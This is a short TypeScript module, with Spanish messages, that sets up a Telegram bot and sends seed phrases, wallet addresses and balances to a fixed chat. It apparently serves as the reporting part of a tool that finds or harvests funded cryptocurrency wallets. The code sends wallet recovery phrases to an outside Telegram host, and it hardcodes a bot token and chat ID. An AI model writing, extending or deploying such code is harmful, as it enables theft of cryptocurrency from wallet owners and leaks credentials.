import TelegramBot from "node-telegram-bot-api";
import { WalletConCashItem } from "../../interface/WalletConCashItem.interface";

const token = "8574258829:AAHGrKZLc8xvt51idytn4sSVFc0Ga4TzNew";
const bot = new TelegramBot(token, { polling: false });
const chatId = "-1003654161102";

export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
    const mensaje = `   📢 Semilla: 
                        ${msj.frase}
                        ---------------
                        👛 Wallet_${msj.wallet_de}: 
                        ${msj.direccion}
                        ---------------
                        💰 Saldo: ${msj.saldo}
                        `;
      bot
      .sendMessage(chatId, mensaje)
      .then(() => {
        console.log("Mensaje enviado con éxito 📢");
      })
      .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
      });
  };

  export const enviarMensajeTelegramStart = (msj: string): void => {
    const mensaje = `   📢 El Bot: 
                        ${msj}
                        `;
      bot
      .sendMessage(chatId, mensaje)
      .then(() => {
        console.log("Mensaje enviado con éxito 📢");
      })
      .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
      });
  };